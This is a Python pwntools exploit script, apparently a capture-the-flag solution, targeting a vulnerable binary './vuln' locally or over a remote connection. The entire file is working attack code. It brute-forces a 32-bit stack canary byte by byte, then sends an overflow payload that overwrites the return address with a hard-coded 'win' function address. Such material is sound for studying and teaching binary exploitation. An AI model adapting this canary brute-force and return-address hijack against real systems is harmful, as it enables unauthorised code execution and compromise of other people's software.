#!/bin/python3
from pwn import *
from time import sleep

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

def make_io() -> tube:
    if args.LOCAL:
        if args.GDBSCRIPT:
            io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
        else:
            io: tube = process(binary.path)
    else:
        io: tube = remote(host, port)
    return io

###########
# EXPLOIT #
###########
UNTIL_CANARY = 0x40
EBP_DISTANCE = 0x50
WIN = 0x8049336

context.log_level = "ERROR"
canary = b"" # b"BiRd"
for i in range(4):
    for byte in map(p8, range(1<<8)):
        print("trying", byte, "| ", end="", flush=True)
        sleep(0.1)
        io = make_io()
        io.sendline(str(UNTIL_CANARY + i + 1).encode())
        io.send(b"A" * UNTIL_CANARY + canary + byte)
        if io.recvall().find(b"Ok...") != -1:
            canary += byte
            print()
            print(canary)
            print()
            break
    else:
        raise RuntimeError(f"canary at byte {i} cannot be bruteforced")

print("Got canary:", canary)
context.log_level = "INFO"
io = make_io()
io.sendline(str(EBP_DISTANCE + 0x8).encode())
payload = b"A" * UNTIL_CANARY + canary + b"B" * (EBP_DISTANCE - UNTIL_CANARY) + p32(WIN)
assert len(payload) == EBP_DISTANCE + 0x8
io.send(payload)
print(io.recvall().decode("utf-8", errors="replace"))
